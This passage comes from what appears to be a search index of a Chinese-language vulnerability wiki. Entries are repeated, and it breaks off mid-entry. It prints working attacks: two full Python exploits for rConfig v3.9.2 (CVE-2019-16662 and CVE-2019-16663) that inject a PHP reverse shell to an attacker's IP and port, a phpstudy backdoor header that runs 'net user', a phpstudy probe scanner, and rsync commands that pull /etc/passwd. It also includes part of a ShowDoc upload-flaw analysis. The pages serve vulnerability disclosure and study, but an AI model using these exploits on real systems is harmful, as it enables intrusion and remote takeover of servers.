\u5728\u8bf7\u6c42\u5934\u6dfb\u52a0 accept-charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 \u5bc6\u6587\u5185\u5bb9\u4e3a echo system('net user');","title":"\u5229\u7528"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"!/usr/bin/env python \u00b6 - - coding: utf-8 - - \u00b6 ''' name: phpstudy\u63a2\u9488 referer: unknown author: Lucifer description: phpstudy\u9ed8\u8ba4\u5b58\u5728\u63a2\u9488l.php,\u6cc4\u9732\u654f\u611f\u4fe1\u606f\u3002 ''' import sys import requests import warnings def run(url): result = ['phpstudy\u63a2\u9488', '', ''] headers = { \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" } payload = \"/l.php\" vulnurl = url + payload try: req = requests.get(vulnurl, headers=headers, timeout=10, verify=False) if r\"phpStudy\" in req.text and r\"php_version\" in req.text: result[2]= '\u5b58\u5728' result[1] = vulnurl else: result[2]= '\u4e0d\u5b58\u5728' except: result[2]='\u4e0d\u5b58\u5728' return result if name == \" main \": warnings.filterwarnings(\"ignore\") testVuln = run(sys.argv[1])","title":"Phpstudy\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#usrbinenv-python","text":"","title":"!/usr/bin/env python"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#-coding-utf-8-","text":"''' name: phpstudy\u63a2\u9488 referer: unknown author: Lucifer description: phpstudy\u9ed8\u8ba4\u5b58\u5728\u63a2\u9488l.php,\u6cc4\u9732\u654f\u611f\u4fe1\u606f\u3002 ''' import sys import requests import warnings def run(url): result = ['phpstudy\u63a2\u9488', '', ''] headers = { \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" } payload = \"/l.php\" vulnurl = url + payload try: req = requests.get(vulnurl, headers=headers, timeout=10, verify=False) if r\"phpStudy\" in req.text and r\"php_version\" in req.text: result[2]= '\u5b58\u5728' result[1] = vulnurl else: result[2]= '\u4e0d\u5b58\u5728' except: result[2]='\u4e0d\u5b58\u5728' return result if name == \" main \": warnings.filterwarnings(\"ignore\") testVuln = run(sys.argv[1])","title":"-- coding: utf-8 --"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/","text":"rConfig v3.9.2 RCE\u6f0f\u6d1e \u00b6 0x00 \u524d\u8a00 \u00b6 rConfig\u662f\u4e00\u4e2a\u5f00\u6e90\u7f51\u7edc\u8bbe\u5907\u914d\u7f6e\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\uff0c\u53ef\u4ee5\u65b9\u4fbf\u7f51\u7edc\u5de5\u7a0b\u5e08\u5feb\u901f\u3001\u9891\u7e41\u7ba1\u7406\u7f51\u7edc\u8bbe\u5907\u5feb\u7167\u3002 \u6211\u5728rConfig\u7684\u4e24\u4e2a\u6587\u4ef6\u4e2d\u627e\u5230\u4e86\u4e24\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e\uff0c\u7b2c\u4e00\u4e2a\u6587\u4ef6\u4e3a ajaxServerSettingsChk.php \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 rootUname \u53c2\u6570\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u4e00\u4e2aGET\u8bf7\u6c42\uff0c\u89e6\u53d1\u672a\u6388\u6743RCE\u6f0f\u6d1e\u3002 rootUname \u53c2\u6570\u5728\u6e90\u6587\u4ef6\u7b2c2\u884c\u4e2d\u5b9a\u4e49\uff0c\u968f\u540e\u4f1a\u5728\u7b2c13\u884c\u4f20\u9012\u7ed9 exec \u51fd\u6570\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u63d2\u5165\u8be5\u53c2\u6570\u4e2d\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u548c\u53d1\u73b0\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0b\u6587\u4e2d\u6211\u5c06\u4ecb\u7ecd\u5982\u4f55\u53d1\u73b0\u5e76\u5229\u7528\u8be5\u6f0f\u6d1e\u3002 \u7b2c\u4e8c\u4e2a\u6f0f\u6d1e\u4f4d\u4e8e search.crud.php \u6587\u4ef6\u4e2d\uff0c\u5b58\u5728RCE\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684GET\u8bf7\u6c42\u89e6\u53d1\u8be5\u6f0f\u6d1e\uff0c\u8bf7\u6c42\u4e2d\u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u5176\u4e2d searchTerm \u53c2\u6570\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u503c\uff0c\u4f46\u8be5\u53c2\u6570\u5fc5\u987b\u5b58\u5728\uff0c\u624d\u80fd\u6267\u884c\u5230\u7b2c63\u884c\u7684 exec \u51fd\u6570\u3002 \u6211\u50cf\u5f80\u5e38\u4e00\u6837\u60f3\u5bfb\u627eRCE\u6f0f\u6d1e\uff0c\u56e0\u6b64\u6211\u4f7f\u7528\u81ea\u5df1\u5f00\u53d1\u7684\u4e00\u4e2a python\u811a\u672c \u6765\u641c\u7d22\u6240\u6709\u4e0d\u5b89\u5168\u7684\u51fd\u6570\u3002 0x01 \u672a\u6388\u6743RCE\u6f0f\u6d1e \u00b6 \u8fd0\u884c\u811a\u672c\u540e\uff0c\u6211\u770b\u5230\u4e86\u4e00\u4e9b\u8f93\u51fa\u7ed3\u679c\u3002\u68c0\u67e5\u6587\u4ef6\u540e\uff0c\u6211\u53d1\u73b0\u6709\u4e2a\u6587\u4ef6\u540d\u4e3a ajaxServerSettingsChk.php \uff0c\u5177\u4f53\u8def\u5f84\u4e3a install/lib/ajaxHandlers/ajaxServerSettingsChk.php \uff0c\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a <?php $rootUname = $_GET [ 'rootUname' ]; // line 2 $array = array (); /* check PHP Safe_Mode is off */ if ( ini_get ( 'safe_mode' )) { $array [ 'phpSafeMode' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;Fail - php safe mode is on - turn it off before you proceed with the installation&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;br/&amp;amp;gt;' ; } else { $array [ 'phpSafeMode' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - php safe mode is off&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;' ; } /* Test root account details */ $rootTestCmd1 = 'sudo -S -u ' . $rootUname . ' chmod 0777 /home 2&amp;amp;gt;&amp;amp;amp;1' ; // line 12 exec ( $rootTestCmd1 , $cmdOutput , $err ); // line 13 $homeDirPerms = substr ( sprintf ( '%o' , fileperms ( '/home' )), - 4 ); if ( $homeDirPerms == '0777' ) { $array [ 'rootDetails' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - root account details are good &amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;' ; } else { $array [ 'rootDetails' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;The root details provided have not passed: ' . $cmdOutput [ 0 ] . '&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;' ; } // reset /home dir permissions $rootTestCmd2 = 'sudo -S -u ' . $rootUname . ' chmod 0755 /home 2&amp;amp;gt;&amp;amp;amp;1' ; // line 21 exec ( $rootTestCmd2 , $cmdOutput , $err ); // line 22 echo json_encode ( $array ); POC x1 \u00b6 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16662 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) if len ( sys . argv ) != 4 : print \"[+] Usage : ./exploit.py target ip port\" exit () target = sys . argv [ 1 ] ip = sys . argv [ 2 ] port = sys . argv [ 3 ] payload = quote ( ''';php -r '$sock=fsockopen(\" {0} \", {1} );exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#''' . format ( ip , port )) install_path = target + \"/install\" req = requests . get ( install_path , verify = False ) if req . status_code == 404 : print \"[-] Installation directory not found!\" print \"[-] Exploitation failed !\" exit () elif req . status_code == 200 : print \"[+] Installation directory found!\" url_to_send = target + \"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=\" + payload print \"[+] Triggering the payload\" print \"[+] Check your listener !\" requests . get ( url_to_send , verify = False ) POC x2 \u00b6 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16663 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) if len ( sys . argv ) != 6 : print \"[+] Usage : ./exploit.py target username password ip port\" exit () target = sys . argv [ 1 ] username = sys . argv [ 2 ] password = sys . argv [ 3 ] ip = sys . argv [ 4 ] port = sys . argv [ 5 ] request = requests . session () login_info = { \"user\" : username , \"pass\" : password , \"sublogin\" : 1 } login_request = request . post ( target + \"/lib/crud/userprocess.php\" , login_info , verify = False , allow_redirects = True ) dashboard_request = request . get ( target + \"/dashboard.php\" , allow_redirects = False ) if dashboard_request . status_code == 200 : print \"[+] LoggedIn successfully\" payload = '''\"\"&amp;&amp;php -r '$sock=fsockopen(\" {0} \", {1} );exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#''' . format ( ip , port ) encoded_request = target + \"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand= {0} \" . format ( quote ( payload )) print \"[+] triggering the payload\" print \"[+] Check your listener !\" exploit_req = request . get ( encoded_request ) elif dashboard_request . status_code == 302 : print \"[-] Wrong credentials !\" exit () \u539f\u6587\uff1a https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/ \u00b6 \u82f1\u8bd1\u4e2d\uff1a https://www.anquanke.com/post/id/189795 \u00b6","title":"rConfig v3.9.2 RCE\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#rconfig-v392-rce","text":"","title":"rConfig v3.9.2 RCE\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#0x00","text":"rConfig\u662f\u4e00\u4e2a\u5f00\u6e90\u7f51\u7edc\u8bbe\u5907\u914d\u7f6e\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\uff0c\u53ef\u4ee5\u65b9\u4fbf\u7f51\u7edc\u5de5\u7a0b\u5e08\u5feb\u901f\u3001\u9891\u7e41\u7ba1\u7406\u7f51\u7edc\u8bbe\u5907\u5feb\u7167\u3002 \u6211\u5728rConfig\u7684\u4e24\u4e2a\u6587\u4ef6\u4e2d\u627e\u5230\u4e86\u4e24\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e\uff0c\u7b2c\u4e00\u4e2a\u6587\u4ef6\u4e3a ajaxServerSettingsChk.php \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 rootUname \u53c2\u6570\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u4e00\u4e2aGET\u8bf7\u6c42\uff0c\u89e6\u53d1\u672a\u6388\u6743RCE\u6f0f\u6d1e\u3002 rootUname \u53c2\u6570\u5728\u6e90\u6587\u4ef6\u7b2c2\u884c\u4e2d\u5b9a\u4e49\uff0c\u968f\u540e\u4f1a\u5728\u7b2c13\u884c\u4f20\u9012\u7ed9 exec \u51fd\u6570\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u63d2\u5165\u8be5\u53c2\u6570\u4e2d\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u548c\u53d1\u73b0\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0b\u6587\u4e2d\u6211\u5c06\u4ecb\u7ecd\u5982\u4f55\u53d1\u73b0\u5e76\u5229\u7528\u8be5\u6f0f\u6d1e\u3002 \u7b2c\u4e8c\u4e2a\u6f0f\u6d1e\u4f4d\u4e8e search.crud.php \u6587\u4ef6\u4e2d\uff0c\u5b58\u5728RCE\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684GET\u8bf7\u6c42\u89e6\u53d1\u8be5\u6f0f\u6d1e\uff0c\u8bf7\u6c42\u4e2d\u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u5176\u4e2d searchTerm \u53c2\u6570\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u503c\uff0c\u4f46\u8be5\u53c2\u6570\u5fc5\u987b\u5b58\u5728\uff0c\u624d\u80fd\u6267\u884c\u5230\u7b2c63\u884c\u7684 exec \u51fd\u6570\u3002 \u6211\u50cf\u5f80\u5e38\u4e00\u6837\u60f3\u5bfb\u627eRCE\u6f0f\u6d1e\uff0c\u56e0\u6b64\u6211\u4f7f\u7528\u81ea\u5df1\u5f00\u53d1\u7684\u4e00\u4e2a python\u811a\u672c \u6765\u641c\u7d22\u6240\u6709\u4e0d\u5b89\u5168\u7684\u51fd\u6570\u3002","title":"0x00 \u524d\u8a00"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#0x01-rce","text":"\u8fd0\u884c\u811a\u672c\u540e\uff0c\u6211\u770b\u5230\u4e86\u4e00\u4e9b\u8f93\u51fa\u7ed3\u679c\u3002\u68c0\u67e5\u6587\u4ef6\u540e\uff0c\u6211\u53d1\u73b0\u6709\u4e2a\u6587\u4ef6\u540d\u4e3a ajaxServerSettingsChk.php \uff0c\u5177\u4f53\u8def\u5f84\u4e3a install/lib/ajaxHandlers/ajaxServerSettingsChk.php \uff0c\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a <?php $rootUname = $_GET [ 'rootUname' ]; // line 2 $array = array (); /* check PHP Safe_Mode is off */ if ( ini_get ( 'safe_mode' )) { $array [ 'phpSafeMode' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;Fail - php safe mode is on - turn it off before you proceed with the installation&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;br/&amp;amp;gt;' ; } else { $array [ 'phpSafeMode' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - php safe mode is off&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;' ; } /* Test root account details */ $rootTestCmd1 = 'sudo -S -u ' . $rootUname . ' chmod 0777 /home 2&amp;amp;gt;&amp;amp;amp;1' ; // line 12 exec ( $rootTestCmd1 , $cmdOutput , $err ); // line 13 $homeDirPerms = substr ( sprintf ( '%o' , fileperms ( '/home' )), - 4 ); if ( $homeDirPerms == '0777' ) { $array [ 'rootDetails' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - root account details are good &amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;' ; } else { $array [ 'rootDetails' ] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;The root details provided have not passed: ' . $cmdOutput [ 0 ] . '&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;' ; } // reset /home dir permissions $rootTestCmd2 = 'sudo -S -u ' . $rootUname . ' chmod 0755 /home 2&amp;amp;gt;&amp;amp;amp;1' ; // line 21 exec ( $rootTestCmd2 , $cmdOutput , $err ); // line 22 echo json_encode ( $array );","title":"0x01 \u672a\u6388\u6743RCE\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#poc-x1","text":"#!/usr/bin/python # Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16662 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) if len ( sys . argv ) != 4 : print \"[+] Usage : ./exploit.py target ip port\" exit () target = sys . argv [ 1 ] ip = sys . argv [ 2 ] port = sys . argv [ 3 ] payload = quote ( ''';php -r '$sock=fsockopen(\" {0} \", {1} );exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#''' . format ( ip , port )) install_path = target + \"/install\" req = requests . get ( install_path , verify = False ) if req . status_code == 404 : print \"[-] Installation directory not found!\" print \"[-] Exploitation failed !\" exit () elif req . status_code == 200 : print \"[+] Installation directory found!\" url_to_send = target + \"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=\" + payload print \"[+] Triggering the payload\" print \"[+] Check your listener !\" requests . get ( url_to_send , verify = False )","title":"POC x1"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#poc-x2","text":"#!/usr/bin/python # Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16663 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) if len ( sys . argv ) != 6 : print \"[+] Usage : ./exploit.py target username password ip port\" exit () target = sys . argv [ 1 ] username = sys . argv [ 2 ] password = sys . argv [ 3 ] ip = sys . argv [ 4 ] port = sys . argv [ 5 ] request = requests . session () login_info = { \"user\" : username , \"pass\" : password , \"sublogin\" : 1 } login_request = request . post ( target + \"/lib/crud/userprocess.php\" , login_info , verify = False , allow_redirects = True ) dashboard_request = request . get ( target + \"/dashboard.php\" , allow_redirects = False ) if dashboard_request . status_code == 200 : print \"[+] LoggedIn successfully\" payload = '''\"\"&amp;&amp;php -r '$sock=fsockopen(\" {0} \", {1} );exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#''' . format ( ip , port ) encoded_request = target + \"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand= {0} \" . format ( quote ( payload )) print \"[+] triggering the payload\" print \"[+] Check your listener !\" exploit_req = request . get ( encoded_request ) elif dashboard_request . status_code == 302 : print \"[-] Wrong credentials !\" exit ()","title":"POC x2"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#httpsshellssystemsrconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662","text":"","title":"\u539f\u6587\uff1a https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#httpswwwanquankecompostid189795","text":"","title":"\u82f1\u8bd1\u4e2d\uff1a https://www.anquanke.com/post/id/189795"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 rsync\u662fLinux\u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u652f\u6301\u901a\u8fc7rsync\u534f\u8bae\u3001ssh\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u4f20\u8f93\u3002\u5176\u4e2drsync\u534f\u8bae\u9ed8\u8ba4\u76d1\u542c873\u7aef\u53e3\uff0c\u5982\u679c\u76ee\u6807\u5f00\u542f\u4e86rsync\u670d\u52a1\uff0c\u5e76\u4e14\u6ca1\u6709\u914d\u7f6eACL\u6216\u8bbf\u95ee\u5bc6\u7801\uff0c\u6211\u4eec\u5c06\u53ef\u4ee5\u8bfb\u5199\u76ee\u6807\u670d\u52a1\u5668\u6587\u4ef6\u3002 \u73af\u5883\u642d\u5efa \u00b6 cd vulhub/rsync/common `````` docker-compose build && docker-compose build \u73af\u5883\u542f\u52a8\u540e\uff0c\u6211\u4eec\u7528rsync\u547d\u4ee4\u8bbf\u95ee\u4e4b\uff1a \u6709\u4e00\u4e2asrc\u6a21\u5757\uff0c\u6211\u4eec\u518d\u5217\u51fa\u8fd9\u4e2a\u6a21\u5757\u4e0b\u7684\u6587\u4ef6\uff1a rsync rsync://your-ip:873/src/ \u8fd9\u662f\u4e00\u4e2aLinux\u6839\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff1a rsync -av rsync://your-ip:873/src/etc/passwd ./ \u4fee\u590d\u5efa\u8bae \u00b6 \u914d\u7f6e\u53ea\u8bfb\u914d\u7f6e\u8ba4\u8bc1\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801","title":"rsync \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","text":"rsync\u662fLinux\u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u652f\u6301\u901a\u8fc7rsync\u534f\u8bae\u3001ssh\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u4f20\u8f93\u3002\u5176\u4e2drsync\u534f\u8bae\u9ed8\u8ba4\u76d1\u542c873\u7aef\u53e3\uff0c\u5982\u679c\u76ee\u6807\u5f00\u542f\u4e86rsync\u670d\u52a1\uff0c\u5e76\u4e14\u6ca1\u6709\u914d\u7f6eACL\u6216\u8bbf\u95ee\u5bc6\u7801\uff0c\u6211\u4eec\u5c06\u53ef\u4ee5\u8bfb\u5199\u76ee\u6807\u670d\u52a1\u5668\u6587\u4ef6\u3002","title":"\u524d\u8a00"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_2","text":"cd vulhub/rsync/common `````` docker-compose build && docker-compose build \u73af\u5883\u542f\u52a8\u540e\uff0c\u6211\u4eec\u7528rsync\u547d\u4ee4\u8bbf\u95ee\u4e4b\uff1a \u6709\u4e00\u4e2asrc\u6a21\u5757\uff0c\u6211\u4eec\u518d\u5217\u51fa\u8fd9\u4e2a\u6a21\u5757\u4e0b\u7684\u6587\u4ef6\uff1a rsync rsync://your-ip:873/src/ \u8fd9\u662f\u4e00\u4e2aLinux\u6839\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff1a rsync -av rsync://your-ip:873/src/etc/passwd ./","title":"\u73af\u5883\u642d\u5efa"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_3","text":"\u914d\u7f6e\u53ea\u8bfb\u914d\u7f6e\u8ba4\u8bc1\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","text":"showdoc\u7684api_page\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3010\u9700\u8981\u767b\u5f55\u3011 \u00b6 \u80cc\u666f \u00b6 ShowDoc is a tool greatly applicable for an IT team to share documents online\u4e00\u4e2a\u975e\u5e38\u9002\u5408IT\u56e2\u961f\u7684\u5728\u7ebfAPI\u6587\u6863\u3001\u6280\u672f\u6587\u6863\u5de5\u5177 \u5b98\u7f51 \uff1a https://www.showdoc.cc/ GitHub\u4e3b\u9875\uff1a https://github.com/star7th/showdoc \u5f53\u524d\u6d4b\u8bd5\u7248\u672c\uff1a v2.6.7 \u6f0f\u6d1e\u70b9 \u00b6 https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L258 //\u4e0a\u4f20\u9644\u4ef6 public function upload(){ $login_user = $this->checkLogin(); $item_id = I(\"item_id/d\") ? I(\"item_id/d\") : 0 ; $page_id = I(\"page_id/d\") ? I(\"page_id/d\") : 0 ; $uploadFile = $_FILES['file'] ; if (!$page_id) { $this->sendError(10103,\"\u8bf7\u81f3\u5c11\u5148\u4fdd\u5b58\u4e00\u6b21\u9875\u9762\u5185\u5bb9\"); return; } if (!$this->checkItemPermn($login_user['uid'] , $item_id)) { $this->sendError(10103); return; } if (!$uploadFile) { return false; } if (strstr(strip_tags(strtolower($_FILES['editormd-image-file']['name'])), \".php\") ) { return false; } $upload = new \\Think\\Upload();// \u5b9e\u4f8b\u5316\u4e0a\u4f20\u7c7b $upload->maxSize = 4145728000 ;// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5927\u5c0f $upload->rootPath = './../Public/Uploads/';// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u76ee\u5f55 $upload->savePath = '';// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5b50\u76ee\u5f55 $info = $upload->uploadOne($uploadFile) ; if(!$info) {// \u4e0a\u4f20\u9519\u8bef\u63d0\u793a\u9519\u8bef\u4fe1\u606f $this->error($upload->getError()); return; }else{// \u4e0a\u4f20\u6210\u529f \u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u4fe1\u606f $url = get_domain().__ROOT__.substr($upload->rootPath,1).$info['savepath'].$info['savename'] ; $insert = array( \"uid\" => $login_user['uid'], \"item_id\" => $item_id, \"page_id\" => $page_id, \"display_name\" => $uploadFile['name'], \"file_type\" => $uploadFile['type'], \"file_size\" => $uploadFile['size'], \"real_url\" => $url, \"addtime\" => time(), ); $ret = D(\"UploadFile\")->add($insert); echo json_encode(array(\"url\"=>$url,\"success\"=>1)); } } \u76f8\u6bd4 